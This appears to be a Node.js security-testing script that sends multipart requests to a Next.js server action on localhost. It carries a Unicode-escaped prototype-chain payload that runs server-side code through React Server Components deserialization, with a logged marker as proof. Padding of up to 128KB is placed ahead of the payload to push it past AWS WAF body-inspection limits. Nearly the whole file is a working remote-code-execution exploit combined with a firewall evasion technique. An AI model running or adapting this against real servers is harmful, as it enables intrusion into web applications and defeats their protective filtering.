/**
 * Oversize Body WAF Bypass Test
 *
 * AWS WAF body inspection limits:
 * - Default: 8KB for regional, 16KB for CloudFront
 * - Can be configured up to 64KB
 * - OversizeHandling: CONTINUE means it processes what it can
 *
 * Strategy: Pad the body so exploit payload falls AFTER the inspection limit
 */
const http = require('http');

const boundary = '----WebKitFormBoundary7MA4YWxk';

function buildOversizeBody(paddingKB, marker) {
  // Create padding that comes BEFORE the exploit
  // Use a legitimate-looking form field with lots of data
  const paddingSize = paddingKB * 1024;
  const padding = 'A'.repeat(paddingSize);

  const field0 = JSON.stringify({
    "\u0074\u0068\u0065\u006e": "$1:\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f:\u0074\u0068\u0065\u006e",
    "\u0073\u0074\u0061\u0074\u0075\u0073": "\u0072\u0065\u0073\u006f\u006c\u0076\u0065\u0064\u005f\u006d\u006f\u0064\u0065\u006c",
    "\u0072\u0065\u0061\u0073\u006f\u006e": -1,
    "\u0076\u0061\u006c\u0075\u0065": "{\"then\":\"$B1337\"}",
    "\u005f\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065": {
      "\u005f\u0070\u0072\u0065\u0066\u0069\u0078": `console.log('${marker}');//`,
      "\u005f\u0063\u0068\u0075\u006e\u006b\u0073": "$Q2",
      "\u005f\u0066\u006f\u0072\u006d\u0044\u0061\u0074\u0061": {
        "\u0067\u0065\u0074": "$1:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"
      }
    }
  });

  const parts = [];

  // PADDING FIELD FIRST - pushes exploit past WAF inspection limit
  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="padding"\r\n\r\n${padding}`);

  // Exploit payload AFTER the padding
  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="0"\r\n\r\n${field0}`);
  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"`);
  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]`);
  parts.push(`--${boundary}--`);

  return parts.join('\r\n') + '\r\n';
}

function sendRequest(body) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'localhost',
      port: 3000,
      path: '/',
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': Buffer.byteLength(body),
        'Next-Action': 'test-oversize'
      },
      timeout: 30000
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });

    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });

    req.write(body);
    req.end();
  });
}

async function main() {
  console.log('='.repeat(60));
  console.log('Oversize Body WAF Bypass Test');
  console.log('='.repeat(60));
  console.log('\nAWS WAF body inspection limits:');
  console.log('  - Regional WAF default: 8KB');
  console.log('  - CloudFront WAF default: 16KB');
  console.log('  - Maximum configurable: 64KB');
  console.log('\nStrategy: Put padding BEFORE exploit to push it past limit\n');

  const tests = [
    { kb: 0, marker: 'SIZE-0KB' },
    { kb: 8, marker: 'SIZE-8KB' },
    { kb: 16, marker: 'SIZE-16KB' },
    { kb: 32, marker: 'SIZE-32KB' },
    { kb: 64, marker: 'SIZE-64KB' },
    { kb: 128, marker: 'SIZE-128KB' },
  ];

  for (const test of tests) {
    const body = buildOversizeBody(test.kb, test.marker);
    const totalSize = body.length;
    const exploitOffset = body.indexOf('"$@');

    console.log(`\nTesting ${test.kb}KB padding:`);
    console.log(`  Total body size: ${(totalSize / 1024).toFixed(1)}KB`);
    console.log(`  $@ pattern at offset: ${(exploitOffset / 1024).toFixed(1)}KB`);

    try {
      const result = await sendRequest(body);
      console.log(`  HTTP Status: ${result.status}`);

      if (result.status === 200) {
        console.log(`  ✓ Request accepted - check server for ${test.marker}`);
      }
    } catch (err) {
      console.log(`  ✗ Error: ${err.message}`);
    }

    // Small delay between requests
    await new Promise(r => setTimeout(r, 500));
  }

  console.log('\n' + '='.repeat(60));
  console.log('Check server console for which SIZE-* markers appeared');
  console.log('='.repeat(60));
}

main().catch(console.error);
